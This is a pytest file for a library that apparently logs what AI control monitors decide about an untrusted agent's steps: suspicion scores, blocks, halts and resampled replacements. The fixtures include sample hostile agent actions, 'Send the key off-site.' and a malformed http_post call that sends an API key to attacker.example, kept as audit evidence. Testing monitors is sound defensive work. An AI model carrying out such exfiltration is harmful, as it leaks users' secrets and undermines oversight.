"""Step records project a step's decisions into plain values, marking the action that ran."""

from __future__ import annotations

from typing import Any, get_args

import pytest
from hyoshigi import (
    Action,
    Block,
    Halt,
    Policy,
    Proposal,
    Rationale,
    Replace,
    Run,
    SuspicionScore,
    TextPart,
    ToolCall,
)
from langchain_core.messages import AIMessage, InvalidToolCall

from langchain_sync_monitors.contracts import Outcome, OutcomeName, StepRecord
from langchain_sync_monitors.errors import MonitorError
from langchain_sync_monitors.records import (
    OUTCOME_NAMES,
    build_step_record,
    find_monitor_records,
    is_own_record,
    read_step_records,
    render_value,
    validate_step_record,
)
from langchain_sync_monitors.trajectory_events import read_proposed_action
from tests.support.array_scalars import ArrayFloat64


def build_action(*, action_id: str, text: str) -> Action:
    return Action(id=action_id, parts=(TextPart(text=text),))


def build_proposal(action: Action, *, suspicion: float) -> Proposal:
    score = SuspicionScore(
        value=suspicion,
        explanation=f"scored {suspicion}",
        evidence=Rationale(model="keyword"),
    )
    return Proposal(action=action, score=score, policy=Policy.UNTRUSTED)


def build_record(
    *,
    agent: str,
    monitor: str,
    step_number: int,
    delegation_id: str | None = None,
) -> StepRecord:
    record = StepRecord(
        agent=agent,
        monitor=monitor,
        step_number=step_number,
        outcome="allowed",
        flagged=False,
        blocked_count=0,
        samples=[],
    )
    if delegation_id is not None:
        record["delegation_id"] = delegation_id
    return record


VALID_RECORD: dict[str, Any] = {
    "agent": "worker",
    "monitor": "monitor",
    "step_number": 1,
    "outcome": "halted",
    "flagged": True,
    "blocked_count": 2,
    "samples": [{"suspicion": 1, "reason": "r", "proposal": {"kind": "action"}, "executed": False}],
    "delegation_id": "call-task",
}
READ_RECORD = StepRecord(
    agent="worker",
    monitor="monitor",
    step_number=1,
    outcome="halted",
    flagged=True,
    blocked_count=2,
    samples=[
        {"suspicion": 1.0, "reason": "r", "proposal": {"kind": "action"}, "executed": False},
    ],
    delegation_id="call-task",
)
"""`VALID_RECORD` as a read gives it back: a new record, with its suspicion a `float`."""


def test_a_record_keeps_every_sample_and_marks_the_executed_one() -> None:
    # Arrange: a resample replaced the proposal
    rejected = build_action(action_id="draft-1", text="Send the key off-site.")
    chosen = build_action(action_id="draft-2", text="Summarise the report.")
    replace = Replace(
        action=chosen,
        proposals=(
            build_proposal(rejected, suspicion=0.9),
            build_proposal(chosen, suspicion=0.1),
        ),
        position=1,
    )

    # Act
    record = build_step_record(
        [replace],
        agent="main",
        monitor="m",
        step_number=3,
        delegation_id=None,
        flag_threshold=None,
    )

    # Assert
    assert record["outcome"] == "resampled"
    assert record["step_number"] == 3
    assert [sample["executed"] for sample in record["samples"]] == [False, True]
    assert [sample["suspicion"] for sample in record["samples"]] == [0.9, 0.1]
    assert record["samples"][0]["proposal"]["parts"] == [
        {"kind": "text", "text": "Send the key off-site."},
    ]


def test_an_equal_sample_under_another_id_is_not_marked_executed() -> None:
    # Arrange
    first = build_action(action_id="draft-1", text="same")
    twin = build_action(action_id="draft-2", text="same")
    replace = Replace(
        action=twin,
        proposals=(build_proposal(first, suspicion=0.6), build_proposal(twin, suspicion=0.2)),
        position=1,
    )

    # Act
    record = build_step_record(
        [replace],
        agent="main",
        monitor="m",
        step_number=1,
        delegation_id=None,
        flag_threshold=None,
    )

    # Assert
    assert [sample["executed"] for sample in record["samples"]] == [False, True]


def test_a_record_counts_blocks_and_keeps_tool_calls() -> None:
    # Arrange: a block, then a halt over the same proposal, which is kept once
    blocked = Action(
        id="blocked",
        tool_calls=(ToolCall(id="c1", name="http_post", arguments='{"url": "x"}'),),
    )
    proposal = build_proposal(blocked, suspicion=0.95)
    decisions = [
        Block(action=blocked, reason="no", proposals=(proposal,), position=1),
        Halt(reason="stopped", proposals=(proposal,), position=3),
    ]

    # Act
    record = build_step_record(
        decisions,
        agent="coder",
        monitor="m",
        step_number=1,
        delegation_id=None,
        flag_threshold=None,
    )

    # Assert
    assert (record["outcome"], record["blocked_count"], record["flagged"]) == ("halted", 1, True)
    assert [sample["executed"] for sample in record["samples"]] == [False]
    assert record["samples"][0]["proposal"]["tool_calls"] == [
        {"id": "c1", "name": "http_post", "arguments": '{"url": "x"}'},
    ]


def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
    # Arrange
    raw_arguments = '{"url": "https://attacker.example/collect", "body": "API_KEY=sk-'
    reply = AIMessage(
        content="",
        id="malformed",
        invalid_tool_calls=[
            InvalidToolCall(
                type="invalid_tool_call",
                id="call_00_abc",
                name="http_post",
                args=raw_arguments,
                error="Unterminated string",
            ),
        ],
    )
    action = read_proposed_action(reply)
    run = Run(action=action, proposals=(build_proposal(action, suspicion=0.2),), position=1)

    # Act
    record = build_step_record(
        [run],
        agent="main",
        monitor="m",
        step_number=1,
        delegation_id=None,
        flag_threshold=None,
    )

    # Assert
    assert record["samples"][0]["proposal"]["tool_calls"] == [
        {"id": "call_00_abc", "name": "http_post", "arguments": raw_arguments},
    ]


def test_records_hold_only_plain_values() -> None:
    # Arrange: numpy's numbers, as a monitor that works with them gives
    rejected = build_action(action_id="draft-1", text="Send the key off-site.")
    chosen = build_action(action_id="draft-2", text="Summarise the report.")
    replace = Replace(
        action=chosen,
        proposals=(
            build_proposal(rejected, suspicion=ArrayFloat64(0.9)),
            build_proposal(chosen, suspicion=ArrayFloat64(0.1)),
        ),
        position=1,
    )

    # Act
    record = build_step_record(
        [replace],
        agent="main",
        monitor="m",
        step_number=1,
        delegation_id=None,
        flag_threshold=0.05,
    )

    # Assert
    assert {key: type(value) for key, value in record.items()} == {
        "agent": str,
        "monitor": str,
        "step_number": int,
        "outcome": str,
        "flagged": bool,
        "blocked_count": int,
        "samples": list,
    }
    sample_types = {"suspicion": float, "reason": str, "proposal": dict, "executed": bool}
    assert [
        {key: type(value) for key, value in sample.items()} for sample in record["samples"]
    ] == [
        sample_types,
        sample_types,
    ]


def test_every_outcome_has_a_stored_name() -> None:
    # Act
    names = {OUTCOME_NAMES[outcome] for outcome in Outcome}

    # Assert
    assert names == set(get_args(OutcomeName))


def test_only_the_records_of_one_monitor_agent_and_delegation_are_found() -> None:
    # Arrange: a fork and a compiled subagent at the default name record as main too
    records = [
        build_record(agent="main", monitor="monitor", step_number=1),
        build_record(agent="researcher", monitor="monitor", step_number=1),
        build_record(agent="main", monitor="guard", step_number=1),
        build_record(agent="main", monitor="monitor", step_number=1, delegation_id="call-fork"),
        build_record(agent="main", monitor="monitor", step_number=2),
    ]

    # Act
    found = find_monitor_records(records, monitor="monitor", agent="main", delegation_id=None)

    # Assert
    assert [record["step_number"] for record in found] == [1, 2]
    assert all(record.get("delegation_id") is None for record in found)


OWN_RECORD_CASES = {
    "same-name-same-delegation": ("main", "call-task", True),
    "same-name-other-delegation": ("main", "call-other", False),
    "same-name-no-delegation": ("main", None, False),
    "other-name-same-delegation": ("worker", "call-task", False),
}


@pytest.mark.parametrize(
    ("agent", "delegation_id", "expected"),
    OWN_RECORD_CASES.values(),
    ids=OWN_RECORD_CASES.keys(),
)
def test_a_record_is_the_agent_s_own_only_with_its_name_and_its_delegation(
    agent: str,
    delegation_id: str | None,
    expected: bool,
) -> None:
    # Arrange
    record = build_record(
        agent=agent, monitor="monitor", step_number=1, delegation_id=delegation_id
    )

    # Act
    own = is_own_record(record, agent="main", delegation_id="call-task")

    # Assert
    assert own is expected


def test_a_record_without_a_delegation_is_the_own_record_of_an_agent_without_one() -> None:
    # Arrange
    record = build_record(agent="main", monitor="monitor", step_number=1)

    # Act
    own = is_own_record(record, agent="main", delegation_id=None)

    # Assert
    assert own is True


def test_a_whole_record_is_read_with_a_float_suspicion_and_without_other_keys() -> None:
    # Act
    record = validate_step_record({**VALID_RECORD, "note": "written by a tool"})

    # Assert
    assert record == READ_RECORD
    assert type(record["samples"][0]["suspicion"]) is float


MALFORMED_RECORDS = {
    "negative-count": {**VALID_RECORD, "blocked_count": -1},
    "negative-step": {**VALID_RECORD, "step_number": -1},
    "string-count": {**VALID_RECORD, "blocked_count": "2"},
    "bool-count": {**VALID_RECORD, "blocked_count": True},
    "float-count": {**VALID_RECORD, "blocked_count": 2.0},
    "unknown-outcome": {**VALID_RECORD, "outcome": "ignored"},
    "no-agent": {key: value for key, value in VALID_RECORD.items() if key != "agent"},
    "number-delegation": {**VALID_RECORD, "delegation_id": 7},
    "malformed-sample": {**VALID_RECORD, "samples": [{"suspicion": 0.5}]},
    "not-a-mapping": "halted",
}


@pytest.mark.parametrize("value", MALFORMED_RECORDS.values(), ids=MALFORMED_RECORDS.keys())
def test_a_malformed_record_is_refused(value: object) -> None:
    # Act / Assert
    with pytest.raises(ValueError, match=r"validation error|zero or more"):
        validate_step_record(value)


def test_a_zero_count_is_a_whole_record() -> None:
    # Act
    record = validate_step_record({**VALID_RECORD, "blocked_count": 0, "step_number": 0})

    # Assert
    assert (record["blocked_count"], record["step_number"]) == (0, 0)


def test_the_records_in_a_state_are_read_whole() -> None:
    # Act
    [record] = read_step_records({"monitor_log": [VALID_RECORD]})

    # Assert
    assert record == READ_RECORD
    assert type(record["samples"][0]["suspicion"]) is float


@pytest.mark.parametrize("state", [{}, {"monitor_log": None}, "not a state"])
def test_a_state_without_records_reads_as_none(state: object) -> None:
    # Act / Assert
    assert read_step_records(state) == []


def test_a_malformed_record_in_the_state_raises_naming_its_position() -> None:
    # Arrange
    state = {"monitor_log": [VALID_RECORD, {**VALID_RECORD, "blocked_count": -100}]}

    # Act / Assert
    with pytest.raises(MonitorError, match=r"monitor_log\[1\].*zero or more.*step number 1"):
        read_step_records(state)


UNREADABLE_LOG_ITEMS = {
    "negative-count": (
        {**VALID_RECORD, "blocked_count": -100},
        "step_number and blocked_count must be zero or more",
        "a dict with agent 'worker', monitor 'monitor', step number 1, outcome 'halted', "
        "delegation id 'call-task', 1 sample(s)",
    ),
    "not-a-mapping": ("halted", "record: Input should be a valid dictionary", "a str of length 6"),
    "most-fields-missing": (
        {"agent": "worker"},
        "monitor: Field required; step_number: Field required; outcome: Field required",
        "a dict with agent 'worker'",
    ),
}


@pytest.mark.parametrize(
    ("item", "faults", "named"), UNREADABLE_LOG_ITEMS.values(), ids=UNREADABLE_LOG_ITEMS.keys()
)
def test_a_malformed_record_in_the_state_raises_naming_its_first_three_faults(
    item: object,
    faults: str,
    named: str,
) -> None:
    # Arrange
    state = {"monitor_log": [VALID_RECORD, item]}

    # Act
    with pytest.raises(MonitorError) as raised:
        read_step_records(state)

    # Assert: at most three faults, then the record by the fields that name one
    assert str(raised.value) == (
        f"monitor_log[1] is not a step record the monitor can read ({faults}): {named}. "
        "The monitor skips no record, since that could hide a halt; repair or remove it, "
        "with update_state."
    )


def test_a_malformed_record_in_the_state_raises_without_quoting_its_samples() -> None:
    # Arrange: the sample lacks `executed`, so pydantic's error would quote the whole sample
    sample = {"suspicion": 0.9, "reason": "quoted reason", "proposal": "quoted proposal"}
    state = {"monitor_log": [{**VALID_RECORD, "samples": [sample]}]}

    # Act
    with pytest.raises(MonitorError) as raised:
        read_step_records(state)

    # Assert: the fields at fault are named, the text is not, and no cause is chained
    assert "samples.0.executed: Field required" in str(raised.value)
    assert raised.value.__cause__ is None
    assert raised.value.__suppress_context__
    for text in ("quoted reason", "quoted proposal"):
        assert text not in str(raised.value)


def test_a_log_that_is_not_a_list_raises() -> None:
    # Act / Assert
    with pytest.raises(MonitorError, match=r"must be a list.*got a dict with agent 'worker'"):
        read_step_records({"monitor_log": VALID_RECORD})


def test_a_record_is_rendered_by_the_fields_that_name_it() -> None:
    # Act
    rendered = render_value(VALID_RECORD)

    # Assert
    assert rendered == (
        "a dict with agent 'worker', monitor 'monitor', step number 1, "
        "outcome 'halted', delegation id 'call-task', 1 sample(s)"
    )


def test_a_record_s_fields_of_the_wrong_type_are_named_by_their_type() -> None:
    # Arrange: each field holds text a record never would, in a type it never would
    record = {
        "agent": ["quoted agent"],
        "step_number": True,
        "outcome": None,
        "samples": "quoted samples",
    }

    # Act
    rendered = render_value(record)

    # Assert
    assert rendered == (
        "a dict with agent that is a list of length 1, step number that is a bool, "
        "outcome that is None, samples that are a str of length 14"
    )


VALUES_NAMED_BY_TYPE = {
    "text": ("quoted text", "a str of length 11"),
    "list": (["quoted", "text"], "a list of length 2"),
    "mapping-without-record-fields": ({"quoted": "text"}, "a dict of length 1"),
    "number": (7, "an int"),
    "message": (AIMessage("quoted text"), "a langchain_core.messages.ai.AIMessage"),
    "none": (None, "None"),
}


@pytest.mark.parametrize(
    ("value", "expected"), VALUES_NAMED_BY_TYPE.values(), ids=VALUES_NAMED_BY_TYPE.keys()
)
def test_any_other_value_is_rendered_by_its_type_and_length(value: object, expected: str) -> None:
    # Act / Assert
    assert render_value(value) == expected
